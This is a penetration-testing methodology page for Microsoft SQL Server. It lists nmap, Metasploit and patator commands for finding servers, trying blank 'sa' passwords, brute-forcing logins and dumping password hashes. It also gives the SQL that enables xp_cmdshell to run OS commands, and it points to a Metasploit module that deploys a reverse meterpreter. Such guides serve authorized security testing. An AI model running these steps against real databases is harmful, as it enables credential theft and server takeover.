# MSSQL - Methodology

### Network scan

Nmap can be used to scan the network for exposed MSSQL databases:

```
nmap -v -p 1433 -A -oA nmap_smb <RANGE | CIDR>
```

### Service recon

The Nmap *ms-sql-info.nse* script attempts to determine configuration and
version information for Microsoft SQL Server.  
The script will first gather information by querying the SQL Server Browser
service (that runs by default on UDP port 1434 and provides imprecise
version information) and then sending a probe to the instance to conduct
response packet analysis.

```
nmap --script ms-sql-info --script-args mssql.instance-port=1433 -p 1433 <TARGET>
```

The Metasploit mssql_ping module attempts to retrieve similar information:

```
msf > use auxiliary/scanner/mssql/mssql_ping
```

### Empty password

Whenever targeting a large number of MSSQL services, the
nmap nse script *ms-sql-empty-password.nse* can be used to quickly try to
connect using the sa account and a blank password:

```
nmap -v -sT -p 1433 --script=ms-sql-empty-password.nse <HOSTS>
```

### Authentication brute force

The metasploit auxiliary/scanner/mssql/mssql_login module can be used to brute
force credentials for the service. The BLANK_PASSWORDS option is worth setting
to true.  

The patator tool can be used as well to brute force credentials on the service:

```
patator mssql_login host=<IP> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='Login failed for user'

msf > use auxiliary/scanner/mssql/mssql_login
```

### Query the database

The sqsh CLI tool can be used to make queries to the database:

```
sqsh -U <USERNAME> -P <PASSWORD> -S <IP>:<PORT>
```

The **DBeaver** GUI tool can be used to simply access the database content without
knowing the proper MSSQL syntax.

### Dump hashes

If provided with an user credentials of appropriate DB privileges, the nmap
nse script *ms-sql-dump-hashes.nse* can be used to dump the password hashes
from an MS-SQL server in a format suitable for cracking by tools such as
John-the-ripper.

```
nmap -v -sT -p <PORT> --script=ms-sql-dump-hashes.nse --script-args='mssql.username=<USERNAME>,mssql.password=<PASSWORD>' <IP>
```

### OS commands execution

On MSSQL server, operating system commands can be executed using the
*xp_cmdshell* function.  
The *xp_cmdshell* function is deactivated by default from SQL Server 2000 and
upwards and needs to be activated.  
The following query can be used to activate it given the
account used has sufficient privilege (sysadmin):

```SQL
-- To allow advanced options to be changed.  
EXEC sp_configure 'show advanced options', 1;  
go  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
go  
-- To enable the feature.  
EXEC sp_configure 'xp_cmdshell', 1;  
go
-- To update the currently configured value for this feature.  
RECONFIGURE;  
go  
```

Operating system CMD commands can then be executed:

```SQL
EXEC xp_cmdshell '<CMD>'
go  
```

The Metasploit module *exploit/windows/mssql/mssql_payload* automates the tasks
above to deploy a payload, such as a reverse meterpreter, on the server.
